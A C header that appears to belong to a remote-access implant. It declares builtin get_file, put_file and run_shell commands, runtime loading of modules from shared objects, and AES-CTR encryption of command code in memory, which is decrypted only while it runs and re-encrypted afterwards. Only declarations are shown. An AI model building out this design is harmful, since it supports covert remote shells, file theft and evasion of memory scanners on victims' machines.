#pragma once

#include "../communication/buffer.h"
#include "get_file/get_file.h"
#include "put_file/put_file.h"
#include "run_shell/run_shell.h"
#include "../result.h"
#include "../strings/strings.h"

/**
 * Initialize the builtin commands (get_file, put_file, run_shell).
 *
 * @return  The result of the function.
 */
result initialize_commands();

/**
 * Add module command.
 *
 * Adds a command from a shared object file by path and function name.
 *
 * @param module_path   The path to the shared object containing the command.
 * @param function_name The name of the function (command) in the shared object.
 * @param function_size The size of the command.
 * @param command_id    The ID of the command.
 * @return  The result of the function.
 */
result
add_module_command(const char *module_path, const char *function_name, uint64_t function_size, uint64_t command_id);

/**
 * Add module command from buffer.
 *
 * @see add_module_command.
 *
 * @param buf   The buffer containing all the arguments for add_module_command.
 * @return  The result of function.
 */
result add_module_command_from_buffer(buffer *buf);

/**
 * Encrypt/decrypt command in memory.
 *
 * Since the AES mode used is CTR, which is bidirectional, the encrypt and decrypt operations are the same.
 * Also, since is xcrypts in memory, it first changes the page permissions to write, then xcrypts the code, and finally
 * changes the permissions back again.
 *
 * @param key           The AES key.
 * @param iv            The AES initialization vector.
 * @param start_address The start address of the command.
 * @param end_address   The end address of the command.
 * @return  The result of the function.
 */
result
xcrypt_command(const char *key, const char *iv, const unsigned char *start_address, const unsigned char *end_address);

/**
 * Run a command.
 *
 * Since the commands are encrypted, this function:
 * 1.   Calls xcrypt_command for decryption.
 * 2.   Calls the command itself.
 * 3.   Calls xcrypt_command for encryption.
 *
 * @see xcrypt_command.
 *
 * @param[out] res          The result of the function and the command.
 * @param[in] command_id    The ID of the command.
 * @param[in] key           The AES key of the command's code.
 * @param[in] iv            The AES initialization vector of the command's code.
 * @param[in] buf           The parameters for the command.
 * @return  The results of the command.
 */
buffer run_command(result *res, uint64_t command_id, const char *key, const char *iv, buffer *buf);

/**
 * Remove module command.
 *
 * @param command_id    The ID of the command.
 * @return  The result of the function.
 */
result remove_module_command(uint64_t command_id);

/**
 * Remove module command from buffer.
 *
 * @see remove_module_command.
 *
 * @param buf   The buffer containing all the arguments for remove_module_command.
 * @return  The result of the function.
 */
result remove_module_command_from_buffer(buffer *buf);

/**
 * Destroy module commands.
 *
 * Removes the data about the commands as well as calls the module's destructor.
 */
void destroy_module_commands();

/**
 * Destroy builtin commands.
 */
void destroy_commands();
